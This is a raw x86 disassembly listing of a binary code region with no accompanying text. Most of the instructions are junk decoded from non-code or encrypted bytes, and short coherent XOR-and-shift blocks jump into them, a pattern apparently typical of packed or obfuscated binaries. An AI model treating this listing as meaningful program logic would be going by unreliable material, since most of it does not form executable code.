  407cb2:	lea    esp,[ebx-0x2ed5acbd]
  407cb8:	cli    
  407cb9:	sahf   
  407cba:	adc    DWORD PTR [edi-0x10],edi
  407cbd:	sub    eax,0x5e467612
  407cc2:	iret   
  407cc3:	inc    ebp
  407cc4:	test   BYTE PTR [edx+0x7d],0xa4
  407cc8:	push   ds
  407cc9:	and    dh,BYTE PTR [edx]
  407ccb:	(bad)  
  407ccc:	les    esi,FWORD PTR [ebp-0xde76ae9]
  407cd2:	call   0x6d4:0xa9b15cb3
  407cd9:	imul   esi,DWORD PTR [edx+0x744a12f4],0x4a355830
  407ce3:	push   eax
  407ce4:	inc    esp
  407ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ce6:	shr    DWORD PTR [eax],cl
  407ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ce9:	or     BYTE PTR [ebp+0xe00588a],bh
  407cef:	xor    esp,DWORD PTR [ecx+edi*1-0x304a8d92]
  407cf6:	dec    edx
  407cf7:	or     al,BYTE PTR [edi-0x6c]
  407cfa:	xchg   esi,edi
  407cfc:	xchg   esp,eax
  407cfd:	lock mov ch,0x9
  407d00:	jmp    0x407d27
  407d02:	in     al,0xd6
  407d04:	sub    al,0xa2
  407d06:	js     0x407caa
  407d08:	imul   BYTE PTR [ebx]
  407d0a:	mov    edx,0x25301693
  407d0f:	shl    BYTE PTR [ecx],0x2c
  407d12:	daa    
  407d13:	mov    esp,0xec2bd7a2
  407d18:	mov    al,ds:0x6527d3fe
  407d1d:	xlat   BYTE PTR ds:[ebx]
  407d1e:	mov    bh,0x51
  407d20:	xchg   ecx,eax
  407d21:	inc    ebx
  407d22:	pop    edx
  407d23:	fwait
  407d24:	test   eax,0x11bd6ce
  407d29:	cmp    eax,0x3c8ec801
  407d2e:	lahf   
  407d2f:	in     eax,dx
  407d30:	repnz mul al
  407d33:	and    bl,cl
  407d35:	cmp    dh,cl
  407d37:	sub    eax,0x78f79332
  407d3c:	cwde   
  407d3d:	pop    ebp
  407d3e:	push   eax
  407d3f:	pop    ss
  407d40:	xchg   esp,eax
  407d41:	jb     0x407d9d
  407d43:	xor    DWORD PTR [ebp+0x40],esi
  407d46:	cld    
  407d47:	mov    BYTE PTR ds:0x71722914,bh
  407d4d:	and    DWORD PTR [eax-0x8b874d4],esp
  407d53:	jle    0x407dd4
  407d55:	pop    es
  407d56:	mov    eax,ds:0x79b3cfc1
  407d5b:	jmp    0x5dac:0xd9f7f20e
  407d62:	cmp    eax,DWORD PTR [ebx]
  407d64:	mov    ebp,0x4f0ee1c4
  407d69:	popa   
  407d6a:	and    cl,BYTE PTR [esi+0x5712f373]
  407d70:	jbe    0x407d2b
  407d72:	fstp   QWORD PTR [eax+0x702ae8b0]
  407d78:	inc    eax
  407d79:	loop   0x407dd1
  407d7b:	repz enter 0xa2a7,0xc9
  407d80:	je     0x407d5a
  407d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d83:	arpl   WORD PTR [ebx-0x882f244],bp
  407d89:	or     eax,0x7c864943
  407d8e:	in     eax,0x3c
  407d90:	fistp  QWORD PTR [ebp+0x37]
  407d93:	adc    al,0x3a
  407d95:	(bad)  
  407d96:	and    BYTE PTR [eax],ah
  407d98:	dec    eax
  407d99:	mov    ch,0x27
  407d9b:	rol    DWORD PTR [eax],1
  407d9d:	les    esp,FWORD PTR [ebx-0x1049b0ba]
  407da3:	xchg   ecx,eax
  407da4:	jns    0x407dcc
  407da6:	loopne 0x407da8
  407da8:	rcr    ch,cl
  407daa:	nop
  407dab:	adc    dh,BYTE PTR [ecx+esi*8-0x70ea147a]
  407db2:	xor    esp,ebx
  407db4:	(bad)  
  407db5:	into   
  407db6:	mov    al,0x9c
  407db8:	aad    0x60
  407dba:	cmp    ecx,DWORD PTR [eax+0x797d98c6]
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xcf71c77e
  407e7d:	jo     0x407ea1
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [esi],al
  407e87:	jl     0x407e7c
  407e89:	xor    dl,al
  407e8b:	hlt    
  407e8c:	mov    bl,0x2b
  407e8e:	xor    bh,BYTE PTR [ebx]
  407e90:	paddd  mm7,mm1
  407e93:	(bad)  
  407e94:	jns    0x407e56
  407e96:	les    edi,FWORD PTR [ebx+0x1244c23f]
  407e9c:	stc    
  407e9d:	xlat   BYTE PTR ds:[ebx]
  407e9e:	ins    BYTE PTR es:[edi],dx
  407e9f:	mov    ds:0x7c302625,al
  407ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea5:	mov    al,0xbf
  407ea7:	popf   
  407ea8:	mov    cl,0x1a
  407eaa:	mov    ch,0xb8
  407eac:	cwde   
  407ead:	int3   
  407eae:	jo     0x407eb4
  407eb0:	hlt    
  407eb1:	(bad)  
  407eb2:	(bad)  [edi+0x5c]
  407eb5:	pop    eax
  407eb6:	jnp    0x407e8c
  407eb8:	je     0x407ebd
  407eba:	loop   0x407eba
  407ebc:	bound  ebp,QWORD PTR [edi-0x262a3750]
  407ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec3:	dec    DWORD PTR [esi-0x5c983b7b]
  407ec9:	inc    ebp
  407eca:	iret   
  407ecb:	or     DWORD PTR [ecx+ebp*2+0x42c5e100],ebp
  407ed2:	test   BYTE PTR [edx-0x30619ab1],dh
  407ed8:	jmp    0xee3eb8c1
  407edd:	nop
  407ede:	push   es
  407edf:	pushf  
  407ee0:	(bad)  
  407ee1:	(bad)  
  407ee2:	inc    eax
  407ee3:	js     0x407eb4
  407ee5:	pop    eax
  407ee6:	push   ebx
  407ee7:	popf   
  407ee8:	mov    cl,0x77
  407eea:	fbld   TBYTE PTR [esi-0x3ec2a5aa]
  407ef0:	and    eax,0xc039c9a1
  407ef5:	or     ecx,edi
  407ef7:	aas    
  407ef8:	push   eax
  407ef9:	jmp    0x407f65
  407efb:	loope  0x407ecc
  407efd:	mov    ds:0xd2140830,al
  407f02:	push   ds
  407f03:	jmp    0x910df25c
  407f08:	xor    DWORD PTR [edi+ecx*8-0x67e5b4d6],0x10269ce2
  407f13:	scas   eax,DWORD PTR es:[edi]
  407f14:	ret    
  407f15:	mov    ecx,0xbe2cce18
  407f1a:	or     eax,0x38502cc9
  407f1f:	jge    0x407f63
  407f21:	(bad)  
  407f22:	and    dh,cl
  407f24:	daa    
  407f25:	jle    0x407ebd
  407f27:	test   BYTE PTR [ebx+0x77acf7ed],ah
  407f2d:	xor    WORD PTR [esi+0x235b7678],dx
  407f34:	sbb    eax,DWORD PTR [esi+0x4c44e155]
  407f3a:	push   esp
  407f3b:	imul   edi,DWORD PTR [ebx+ecx*2+0x5457e91b],0xffffffb0
  407f43:	mov    al,0x5d
  407f45:	out    0x7d,al
  407f47:	push   esi
  407f48:	ret    
  407f49:	pop    es
  407f4a:	addr16 pushf 
  407f4c:	push   ebp
  407f4d:	popf   
  407f4e:	sub    DWORD PTR [edi+0x45c3b4ca],0xa14a3f7f
  407f58:	mov    eax,0x590bd10
  407f5d:	ins    BYTE PTR es:[edi],dx
  407f5e:	js     0x407fae
  407f60:	jecxz  0x407f79
  407f62:	dec    esi
  407f63:	mov    gs,esp
  407f65:	shl    BYTE PTR [ebp-0x3a],1
  407f68:	ficomp WORD PTR [ecx-0x51]
  407f6b:	pop    ds
  407f6c:	xchg   esp,eax
  407f6d:	out    dx,al
  407f6e:	mov    cl,ah
  407f70:	xchg   ecx,eax
  407f71:	dec    esp
  407f72:	je     0x407f42
  407f74:	int    0xf9
  407f76:	iret   
  407f77:	dec    edi
  407f78:	aas    
  407f79:	adc    ebx,ebx
  407f7b:	mov    bl,0x23
  407f7d:	xor    BYTE PTR [edi+0x5],ah
  407f80:	rol    DWORD PTR [esi],0x0
  407f83:	mov    ebx,0xaad645
  407f88:	xchg   edi,eax
  407f89:	es cmp dh,bl
  407f8c:	adc    ecx,DWORD PTR [ebp+0x62d0863]
  407f92:	dec    edx
  407f93:	push   0xe142a788
  407f98:	push   ebp
  407f99:	icebp  
  407f9a:	dec    edx
  407f9b:	or     al,0x26
  407f9d:	xlat   BYTE PTR ds:[ebx]
  407f9e:	jge    0x407fa8
  407fa0:	xchg   eax,ebx
  407fa2:	out    dx,al
  407fa3:	adc    DWORD PTR [edx],ebp
  407fa5:	dec    eax
  407fa6:	jno    0x407fda
  407fa8:	cmp    ebp,DWORD PTR [ebp+0x5d]
  407fab:	popa   
  407fac:	dec    ebx
  407fad:	sub    BYTE PTR [edx-0x57314557],al
  407fb3:	rcr    BYTE PTR [ecx+0x3b],0xed
  407fb7:	mov    dl,dh
  407fb9:	sbb    DWORD PTR [esi+edx*1-0x73],ebp
  407fbd:	cs ds pop ecx
  407fc0:	das    
  407fc1:	jo     0x40801f
  407fc3:	ror    DWORD PTR [eax+edx*2+0x3],0x6f
  407fc8:	outs   dx,DWORD PTR ds:[esi]
  407fc9:	retf   0xe6ed
  407fcc:	leave  
  407fcd:	mov    bh,0x7d
  407fcf:	xchg   bl,dl
  407fd1:	cmp    ebx,DWORD PTR [edi+0xb2bd01a]
  407fd7:	into   
  407fd8:	daa    
  407fd9:	xor    DWORD PTR [ecx-0x63a0b57c],0x321f037f
  407fe3:	or     BYTE PTR [esi+0x7737e39a],ch
  407fe9:	les    ecx,FWORD PTR [edi+0x1e]
  407fec:	or     eax,DWORD PTR [ebx]
  407fee:	dec    ebx
  407fef:	out    dx,eax
  407ff0:	add    eax,0x2926d77d
  407ff5:	pop    ecx
  407ff6:	inc    ecx
  407ff7:	cld    
  407ff8:	sbb    edi,DWORD PTR [ecx-0x7eb2b9d7]
  407ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fff:	jg     0x40800c
  408001:	xchg   ecx,eax
  408002:	iret   
  408003:	js     0x408014
  408005:	shl    ecx,1
  408007:	jge    0x408049
  408009:	pop    esp
  40800a:	std    
  40800b:	popa   
  40800c:	push   ebp
  40800d:	and    eax,0x70d160ee
  408012:	push   esp
  408013:	xlat   BYTE PTR ds:[ebx]
  408014:	add    edi,DWORD PTR [ecx+0x7d]
  408017:	jmp    0x408070
  408019:	cmp    eax,0xcffeb9b8
  40801e:	sbb    DWORD PTR [ebp+0x625ce847],edi
  408024:	push   ds
  408025:	sub    BYTE PTR [edx-0xa9d50cb],al
  40802b:	fidiv  WORD PTR [esi+0x24]
  40802e:	loopne 0x40807a
  408030:	stos   DWORD PTR es:[edi],eax
  408031:	inc    eax
  408032:	jmp    0xb761:0x919d699a
  408039:	sar    BYTE PTR [ebx+0x7e],0xf9
  40803d:	mov    dh,0x3
  40803f:	loope  0x407ff9
  408041:	adc    eax,0x270938d3
  408046:	stc    
  408047:	mov    bl,0x6d
  408049:	mov    ebp,0xfd8ecafc
  40804e:	fucom  st(4)
  408050:	lods   eax,DWORD PTR ds:[esi]
  408051:	push   ecx
  408052:	push   0x21c2f780
  408057:	daa    
  408058:	mov    esp,0x7f351b19
  40805d:	sub    al,0x37
  40805f:	stos   BYTE PTR es:[edi],al
  408060:	cmp    al,0xea
  408062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408063:	out    0x8,eax
  408065:	sub    ecx,DWORD PTR [ecx+edx*4-0x55]
  408069:	inc    esi
  40806a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40806b:	icebp  
  40806c:	clc    
  40806d:	aad    0x40
  40806f:	loopne 0x4080b7
  408071:	pushf  
  408072:	fisub  WORD PTR [eax]
  408074:	xlat   BYTE PTR ds:[ebx]
  408075:	xchg   ebx,eax
  408076:	test   eax,0xc0db2797
  40807b:	mov    ebx,0x82d0d49b
  408080:	jmp    0x2ce4:0x1bb43d38
  408087:	push   ds
  408088:	mov    gs,WORD PTR [edx+0x3ff94f86]
  40808e:	mov    bl,bl
  408090:	fidiv  WORD PTR ds:0x7fef1221
  408096:	push   0xffffff8b
  408098:	dec    ebp
  408099:	stc    
  40809a:	push   0x7d07d7fb
  40809f:	loop   0x408045
  4080a1:	sbb    ebp,DWORD PTR [esi+0xa4a0ba3]
  4080a7:	nop
  4080a8:	jmp    0x408124
  4080aa:	imul   edi,ebp,0x2d0e46b
  4080b0:	xor    DWORD PTR [ebx],0x44
  4080b3:	mov    dl,0xf7
  4080b5:	stos   BYTE PTR es:[edi],al
  4080b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080b7:	inc    ecx
  4080b8:	jmp    FWORD PTR [ebx]
  4080ba:	fld    st(7)
  4080bc:	pop    eax
  4080bd:	enter  0x4148,0xbb
  4080c1:	xchg   BYTE PTR ds:0xa63e39f6,al
  4080c7:	cmp    al,0x91
  4080c9:	test   eax,0xc1102b82
  4080ce:	out    0xa,eax
  4080d0:	mov    edx,0xf6580192
  4080d5:	lock (bad) 
  4080d7:	in     al,dx
  4080d8:	xchg   esp,eax
  4080d9:	test   esi,esi
  4080db:	xor    eax,DWORD PTR [eax]
  4080dd:	addr16 pop ds
  4080df:	push   esi
  4080e0:	ret    0x8b0e
  4080e3:	mov    dl,0xbc
  4080e5:	hlt    
  4080e6:	add    DWORD PTR [edx-0x42],ecx
  4080e9:	stos   DWORD PTR es:[edi],eax
  4080ea:	push   es
  4080eb:	lahf   
  4080ec:	mov    cl,0x4e
  4080ee:	pop    edx
  4080ef:	fsub   DWORD PTR [ecx-0x49]
  4080f2:	mov    gs,WORD PTR [edx]
  4080f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080f5:	sbb    al,cl
  4080f7:	sub    DWORD PTR [ecx],0x6d
  4080fa:	jecxz  0x4080ba
  4080fc:	dec    ecx
  4080fd:	pop    eax
  4080fe:	fidiv  DWORD PTR [esp+ebx*1]
  408101:	aas    
  408102:	add    al,0x19
  408104:	je     0x408156
  408106:	dec    edi
  408107:	push   ds
  408108:	xchg   ecx,eax
  408109:	call   0x138b:0x5013c5e6
  408110:	xor    eax,DWORD PTR [ebp-0x2451531a]
  408116:	pop    edi
  408117:	pop    ecx
  408118:	xor    DWORD PTR [esi],edi
  40811a:	mov    WORD PTR ds:0xadc82914,gs
  408120:	add    dh,ch
  408122:	mov    bh,0x1c
  408124:	mov    bh,0x92
  408126:	push   cs
  408127:	push   eax
  408128:	ins    DWORD PTR es:[edi],dx
  408129:	jo     0x40810c
  40812b:	out    dx,eax
  40812c:	lods   al,BYTE PTR ds:[esi]
  40812d:	outs   dx,DWORD PTR ds:[esi]
  40812e:	shr    BYTE PTR [ecx],1
  408130:	(bad)  
  408131:	jge    0x408156
  408133:	jno    0x40815d
  408135:	loopne 0x40816b
  408137:	mov    esi,0x9c354127
  40813c:	xor    BYTE PTR [eax+0x3d],0xd2
  408140:	adc    DWORD PTR [ebx+ebp*4-0x29],esi
  408144:	sub    cl,ah
  408146:	aam    0x60
  408148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408149:	ficomp DWORD PTR [edi]
  40814b:	or     al,0x27
  40814d:	pop    ds
  40814e:	inc    esp
  40814f:	mov    esi,0xf3295ffe
  408154:	pop    ds
  408155:	push   edx
  408156:	fcom   DWORD PTR [esi-0x69d51613]
  40815c:	mov    al,ds:0x80a87f3c
  408161:	mov    eax,ds:0xaccf9c3c
  408166:	or     ebx,ebx
  408168:	ret    
  408169:	jle    0x408110
  40816b:	shl    BYTE PTR [eax],0xcd
  40816e:	ins    DWORD PTR es:[edi],dx
  40816f:	jmp    0x408169
  408171:	sbb    edx,DWORD PTR [eax+0x34]
  408174:	inc    edi
  408175:	xchg   esp,eax
  408176:	inc    ebp
  408177:	sbb    esp,DWORD PTR ds:0x80246cef
  40817d:	shl    BYTE PTR [eax-0x14],0xdd
  408181:	dec    ecx
  408182:	(bad)  
  408183:	loop   0x408191
  408185:	das    
  408186:	inc    edx
  408187:	aad    0x33
  408189:	std    
  40818a:	jl     0x4081e4
  40818c:	idiv   BYTE PTR [edx+0x25d6d29]
  408192:	xor    bh,BYTE PTR [eax-0x70]
  408195:	les    edx,FWORD PTR [ebx]
  408197:	push   0x903de81b
  40819c:	dec    ecx
  40819d:	mov    esi,DWORD PTR [eax+0x254bc900]
  4081a3:	nop
  4081a4:	sub    BYTE PTR [eax+0x20],dh
  4081a7:	imul   ebp,DWORD PTR [esi-0x71bd3da4],0xcc4092ff
  4081b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b2:	add    BYTE PTR [ecx+0x369cc0e2],ah
  4081b8:	je     0x4081f0
  4081ba:	mov    edi,0xb978fa7e
  4081bf:	movups xmm0,XMMWORD PTR [ecx]
  4081c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c3:	out    dx,eax
  4081c4:	retf   
  4081c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081c6:	scas   al,BYTE PTR es:[edi]
  4081c7:	or     bl,BYTE PTR [eax-0x51e91e5d]
  4081cd:	mov    ebp,0x3e0704eb
  4081d3:	mov    al,ds:0x658b91f7
  4081d8:	jae    0x4081fb
  4081da:	mov    ds:0xe7211592,eax
  4081df:	pop    edi
  4081e0:	jecxz  0x40819e
  4081e2:	(bad)  
  4081e3:	sub    esi,DWORD PTR [edx+0x39]
  4081e6:	jb     0x408217
  4081e8:	(bad)  
  4081e9:	jl     0x4081e4
  4081eb:	add    al,0x51
  4081ed:	xor    bh,ch
  4081ef:	and    DWORD PTR [ebp+ebp*8-0x21],edx
  4081f3:	out    dx,eax
  4081f4:	jge    0x4081e8
  4081f6:	stos   DWORD PTR es:[edi],eax
  4081f7:	ret    
  4081f8:	add    bl,BYTE PTR [edx+0x73073e3d]
  4081fe:	ds dec eax
  408200:	je     0x4081bf
  408202:	out    dx,eax
  408203:	hlt    
  408204:	mov    dh,0x0
  408206:	push   edx
  408207:	push   ds
  408208:	popa   
  408209:	sub    al,0xd0
  40820b:	stos   DWORD PTR es:[edi],eax
  40820c:	(bad)  [ecx-0x6f9888e8]
  408212:	outs   dx,BYTE PTR ds:[esi]
  408213:	jg     0x408256
  408215:	mov    ds:0x1a69eeae,al
  40821a:	out    dx,al
  40821b:	pop    ebx
  40821c:	pop    ebx
  40821d:	mov    DWORD PTR [edi+0x14f75d04],ebx
  408223:	sbb    BYTE PTR [ecx+edx*2-0x9],0x2b
  408228:	inc    esp
  408229:	xor    esp,esp
  40822b:	xchg   esi,eax
  40822c:	mov    eax,ds
  40822e:	fwait
  40822f:	shl    DWORD PTR [edi+eiz*4-0x6c5e0ee],1
  408236:	lea    esi,ds:0xb5c2d099
  40823c:	adc    edi,DWORD PTR [edi+0x114abfa2]
  408242:	push   ss
  408243:	adc    DWORD PTR [eax+0x4589f3af],edx
  408249:	xchg   esp,eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x1840709d
  40828a:	sar    DWORD PTR [eax+ebp*4-0x61e7e799],cl
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    cl,ah
  408295:	fiadd  WORD PTR ds:0xd4cb92e1
  40829b:	add    edx,DWORD PTR [esi-0x62]
  40829e:	arpl   WORD PTR ds:0xe20b8294,bp
  4082a4:	pop    ss
  4082a5:	daa    
  4082a6:	inc    esi
  4082a7:	xor    esp,esi
  4082a9:	cmc    
  4082aa:	jae    0x40832a
  4082ac:	rcr    BYTE PTR [bp+di-0x1e0a],cl
  4082b1:	aas    
  4082b2:	arpl   WORD PTR [edi+0x28],ax
  4082b5:	shl    bl,1
  4082b7:	fbld   TBYTE PTR [ecx]
  4082b9:	fisub  DWORD PTR [esi]
  4082bb:	aas    
  4082bc:	mov    ds:0xbc27f4c3,eax
  4082c1:	(bad)  
  4082c2:	js     0x4082a7
  4082c4:	mov    ds:0x74e6615c,eax
  4082c9:	mov    ebp,0xc465518a
  4082ce:	dec    ebp
  4082cf:	pusha  
  4082d0:	mov    edx,0xd69b37a1
  4082d5:	xchg   ebx,eax
  4082d6:	push   ebx
  4082d7:	sti    
  4082d8:	fisttp QWORD PTR [edi+0x63]
  4082db:	pop    eax
  4082dc:	jl     0x4082c5
  4082de:	out    0xa9,eax
  4082e0:	push   cs
  4082e1:	leave  
  4082e2:	xor    al,0x22
  4082e4:	dec    edx
  4082e5:	popa   
  4082e6:	call   0x26f7cca7
  4082eb:	pop    ebp
  4082ec:	mov    edx,0xfcd0e1ad
  4082f1:	cmp    eax,0xf9ee44da
  4082f6:	mov    edx,0x28d8557a
  4082fb:	(bad)  
  4082fc:	into   
  4082fd:	pop    eax
  4082fe:	push   0x1a
  408300:	xor    eax,esi
  408302:	test   eax,0xe86c1694
  408307:	lock ins DWORD PTR es:[edi],dx
  408309:	cmp    esp,ecx
  40830b:	xchg   ebx,eax
  40830c:	xor    ebp,DWORD PTR [eax+0x19]
  40830f:	mov    dh,0xab
  408311:	retf   0xfce5
  408314:	retf   0xb672
  408317:	jmp    0x40831e
  408319:	push   edi
  40831a:	enter  0x558c,0x88
  40831e:	stos   DWORD PTR es:[edi],eax
  40831f:	inc    eax
  408320:	or     al,0x4d
  408322:	mov    dl,0x83
  408324:	pop    esi
  408325:	pop    es
  408326:	inc    edi
  408327:	iret   
  408328:	mov    BYTE PTR ss:[eax-0x1c],ah
  40832c:	inc    ecx
  40832d:	cmp    eax,0x90059663
  408332:	lods   eax,DWORD PTR ds:[esi]
  408333:	daa    
  408334:	adc    eax,0x426f521b
  408339:	jecxz  0x408355
  40833b:	cmp    BYTE PTR [edi+edx*2+0x57671b3a],dh
  408342:	push   ecx
  408343:	sub    DWORD PTR [eax+ecx*4],esp
  408346:	push   edi
  408347:	pushf  
  408348:	inc    BYTE PTR [esp+esi*2+0x6b465c84]
  40834f:	outs   dx,DWORD PTR ds:[esi]
  408350:	ror    BYTE PTR [edx+0x149637a],0x7e
  408357:	jmp    0x263ae2ee
  40835c:	mov    al,0xb5
  40835e:	inc    ebp
  40835f:	retf   
  408360:	mov    ebp,0x813a4993
  408365:	inc    ebp
  408366:	les    eax,FWORD PTR [ebp+0x1e6a3382]
  40836c:	mov    bh,0xa8
  40836e:	cmp    BYTE PTR cs:[ecx],0xb5
  408372:	jp     0x40836f
  408374:	adc    eax,0x87d98b8b
  408379:	cmp    eax,0x18d7a38d
  40837e:	and    ah,BYTE PTR [eax]
  408380:	jg     0x4083e3
  408382:	popf   
  408383:	mul    ecx
  408385:	addr16 fmul st,st(2)
  408388:	je     0x40835f
  40838a:	xchg   BYTE PTR [ecx-0x680649dd],ch
  408390:	stos   DWORD PTR es:[edi],eax
  408391:	sub    cl,al
  408393:	cwde   
  408394:	ror    BYTE PTR [edi+0x609dba63],0xda
  40839b:	fabs   
  40839d:	int    0x21
  40839f:	xchg   esp,eax
  4083a0:	push   ds
  4083a1:	xchg   esp,eax
  4083a2:	sub    al,BYTE PTR [ebp-0x7b056d60]
  4083a8:	dec    ebp
  4083a9:	fdiv   DWORD PTR [ebx]
  4083ab:	xor    DWORD PTR [ebp-0x24],eax
  4083ae:	mov    eax,ss:0x29dbb66f
  4083b4:	cmc    
  4083b5:	fiadd  DWORD PTR ds:0xe8b1c9b9
  4083bb:	adc    cl,BYTE PTR ds:0x4b1fcdb9
  4083c1:	sahf   
  4083c2:	xchg   ecx,eax
  4083c3:	and    DWORD PTR [edx-0xfd7691f],ecx
  4083c9:	scas   eax,DWORD PTR es:[edi]
  4083ca:	mov    ebp,0xac94721f
  4083cf:	cmp    al,0xba
  4083d1:	aad    0x57
  4083d3:	div    BYTE PTR [edx+eax*4]
  4083d6:	xchg   edx,eax
  4083d7:	imul   esp,DWORD PTR [ecx+esi*2],0x873a619d
  4083de:	sbb    DWORD PTR [eax+0x7acb2bed],edx
  4083e4:	and    cl,cl
  4083e6:	lods   al,BYTE PTR ds:[esi]
  4083e7:	jmp    0x6ffe:0xc4f77f75
  4083ee:	pop    ebx
  4083ef:	mov    edi,0xcea5d5e3
  4083f4:	pop    eax
  4083f5:	outs   dx,DWORD PTR ds:[esi]
  4083f6:	cli    
  4083f7:	ins    DWORD PTR es:[edi],dx
  4083f8:	mov    ah,0x2
  4083fa:	lahf   
  4083fb:	in     al,dx
  4083fc:	jecxz  0x408433
  4083fe:	mov    bh,0x2b
  408400:	addr16 mov esp,0xacbcf09
  408406:	stos   BYTE PTR es:[di],al
  408408:	mov    cs,WORD PTR [edx+eiz*8-0xd6c54ba]
  40840f:	aaa    
  408410:	xchg   esp,eax
  408411:	dec    ecx
  408412:	push   ds
  408413:	cwde   
  408414:	pop    ecx
  408415:	sub    DWORD PTR [ebp-0x6767c3f5],ebx
  40841b:	loop   0x4083f0
  40841d:	lods   eax,DWORD PTR ds:[esi]
  40841e:	pop    edi
  40841f:	adc    eax,0x9e86603c
  408424:	push   0x9
  408426:	fild   DWORD PTR [edi]
  408428:	addr16 mov bh,0xee
  40842b:	enter  0xcad5,0x68
  40842f:	loopne 0x408432
  408431:	imul   DWORD PTR ds:0x52780b09
  408437:	icebp  
  408438:	jno    0x408409
  40843a:	mov    al,ds:0xbe3fc46e
  40843f:	xor    eax,0xb97e6bb9
  408444:	dec    esi
  408445:	fmul   QWORD PTR [eax-0x2a6adcc6]
  40844b:	mov    DWORD PTR [ebx+edx*4-0x73],esp
  40844f:	jns    0x408439
  408451:	ins    BYTE PTR es:[edi],dx
  408452:	dec    esp
  408453:	inc    edi
  408454:	daa    
  408455:	cmp    ch,BYTE PTR [ecx]
  408457:	rol    DWORD PTR [edi],1
  408459:	mov    esp,0x2df7e1c3
  40845e:	iret   
  40845f:	dec    ebp
  408460:	pop    eax
  408461:	mov    ds:0x56f1b9fd,eax
  408466:	nop
  408467:	jl     0x4083f9
  408469:	push   edi
  40846a:	fisttp DWORD PTR [esi]
  40846c:	pop    eax
  40846d:	(bad)  
  40846e:	cld    
  40846f:	fdiv   st(6),st
  408471:	loope  0x408451
  408473:	adc    BYTE PTR [esi+0x49242977],bh
  408479:	jo     0x40846f
  40847b:	fnstsw WORD PTR [eax+0x68092ef7]
  408481:	lods   al,BYTE PTR ds:[esi]
  408482:	cmp    al,0x85
  408484:	pop    ebx
  408485:	fisub  DWORD PTR [ebp+0x6249a9bc]
  40848b:	inc    esi
  40848c:	(bad)  
  40848d:	push   ds
  40848e:	xor    esp,esi
